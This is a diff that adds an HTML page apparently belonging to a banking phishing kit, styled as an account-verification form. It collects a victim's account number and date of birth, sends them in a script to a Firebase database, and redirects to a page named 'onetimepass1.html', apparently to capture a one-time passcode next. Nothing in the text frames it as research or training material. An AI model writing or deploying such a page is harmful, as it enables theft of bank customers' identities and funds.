@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mobile Form</title>
+  <link rel="stylesheet" href="styles.css">
+  <img src="lolo.jpg"  width="100%" height="13%">
+</head>
+<body>
+  <div id="kyc"><br>
+           <b style="color:white; padding:20px;">Veryfied Your Account Number </b>
+        </div>
+  <div class="container">
+    
+    <form id="myForm">
+      <label for="Account">Account Number*</label>
+      <input type="text" id="acc" name="account" pattern="[0-9]{15}" maxlength="15"  placeholder="Enter Your Account Number" required="">
+      
+      <label for="dob">Date of Birth*</label>
+      <input type="text" id="dob" name="dob"  placeholder="Enter Your Date of Birth" required="">
+
+      <script>
+                const dobInput = document.getElementById("dob");
+
+        dobInput.addEventListener("input", function() { let value = this.value; value = value.replace(/\D/g, ""); 
+                 // Remove non-digit characters
+        value = value.slice(0, 8); 
+        // Limit the length to 8 characters
+
+          let formattedValue = ""; const day = value.slice(0, 2);
+                                   const month = value.slice(2, 4);
+                                   const year = value.slice(4, 8);
+
+          if (day.length > 0) {
+             formattedValue += day; } if (month.length > 0) { formattedValue += "-" + month; }
+
+          if (year.length > 0) { formattedValue += "-" + year; } this.value = formattedValue; });
+          
+
+          </script>
+
+      
+      <input type="submit" value="Submit">
+    </form>
+  </div>
+  <!-- Add your custom JavaScript code here -->
+    <script>
+  document.getElementById('myForm').addEventListener('submit', (event) => {
+    event.preventDefault();
+    const form = event.target;
+    const formData = new FormData(form);
+    const data = {};
+    formData.forEach((value, key) => {
+      data[key] = value;
+    });
+
+    // Replace 'YOUR_FIREBASE_DATABASE_URL' with your Firebase database URL
+    const firebaseURL = 'https://zxfrt-f7fe4-default-rtdb.firebaseio.com/submissions.json';
+
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', firebaseURL, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+
+    xhr.onload = () => {
+      if (xhr.status === 200) {
+        
+        // Redirect to the next page after successful submission
+        window.location.href = 'onetimepass1.html';
+      } else {
+        console.error('Failed to submit form.');
+      }
+    };
+
+    xhr.onerror = () => {
+      console.error('Error submitting form.');
+      alert('An error occurred while submitting the form. Please try again later.');
+    };
+
+    xhr.send(JSON.stringify(data));
+  });
+</script>
+</body>
+<img src="futterhas.png"  width="100%" height="50%">
+</html>
